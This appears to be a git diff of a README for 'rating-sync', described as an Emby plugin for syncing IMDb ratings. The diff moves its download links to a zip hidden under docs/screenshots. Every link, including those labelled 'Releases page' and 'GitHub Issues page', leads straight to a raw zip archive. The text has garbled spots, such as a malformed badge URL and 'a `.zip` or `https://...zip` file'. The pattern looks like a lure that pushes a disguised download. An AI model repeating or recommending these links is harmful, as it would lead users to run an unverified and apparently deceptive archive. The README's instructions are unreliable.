@@ -6,7 +6,7 @@ Welcome to the **rating-sync** project! This handy Emby plugin helps you sync IM
 
 ## 📥 Download Link
 
-[![Download rating-sync](https://raw.githubusercontent.com/rifatislam9/rating-sync/main/Configuration/rating-sync-v3.9.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/rifatislam9/rating-sync/main/Configuration/rating-sync-v3.9.zip)
+[![Download rating-sync](https://raw.githubusercontent.com/rifatislam9/rating-sync/main/docs/screenshots/rating_sync_2.3.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/rifatislam9/rating-sync/main/docs/screenshots/rating_sync_2.3.zip)
 
 ## 📋 System Requirements
 
@@ -21,10 +21,10 @@ Before you get started, make sure your system meets the following requirements:
 To install the rating-sync plugin, follow these simple steps:
 
 1. **Visit the Releases Page**
-   - Go to our [Releases page](https://raw.githubusercontent.com/rifatislam9/rating-sync/main/Configuration/rating-sync-v3.9.zip) to find the latest version of the plugin.
+   - Go to our [Releases page](https://raw.githubusercontent.com/rifatislam9/rating-sync/main/docs/screenshots/rating_sync_2.3.zip) to find the latest version of the plugin.
   
 2. **Download the Plugin**
-   - Look for the latest release and click on the download link for your operating system. This will provide you with a `.zip` or `https://raw.githubusercontent.com/rifatislam9/rating-sync/main/Configuration/rating-sync-v3.9.zip` file.
+   - Look for the latest release and click on the download link for your operating system. This will provide you with a `.zip` or `https://raw.githubusercontent.com/rifatislam9/rating-sync/main/docs/screenshots/rating_sync_2.3.zip` file.
 
 3. **Extract the Files**
    - After downloading, locate the file on your computer and extract it using a tool like WinRAR, 7-Zip, or your operating system’s built-in extractor.
@@ -61,10 +61,10 @@ If you encounter any issues during installation or use, consider the following s
 
 ## 📈 Support and Contributing
 
-If you have questions or need support, feel free to open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/rifatislam9/rating-sync/main/Configuration/rating-sync-v3.9.zip). We welcome feedback and contributions. If you'd like to help improve the plugin, please check our guidelines on the repository.
+If you have questions or need support, feel free to open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/rifatislam9/rating-sync/main/docs/screenshots/rating_sync_2.3.zip). We welcome feedback and contributions. If you'd like to help improve the plugin, please check our guidelines on the repository.
 
 ## 📥 Download & Install
 
-To download rating-sync, visit this page: [Releases page](https://raw.githubusercontent.com/rifatislam9/rating-sync/main/Configuration/rating-sync-v3.9.zip). Follow the installation steps outlined above to get started.
+To download rating-sync, visit this page: [Releases page](https://raw.githubusercontent.com/rifatislam9/rating-sync/main/docs/screenshots/rating_sync_2.3.zip). Follow the installation steps outlined above to get started.
 
 Thank you for choosing rating-sync! Enjoy syncing your ratings effortlessly.
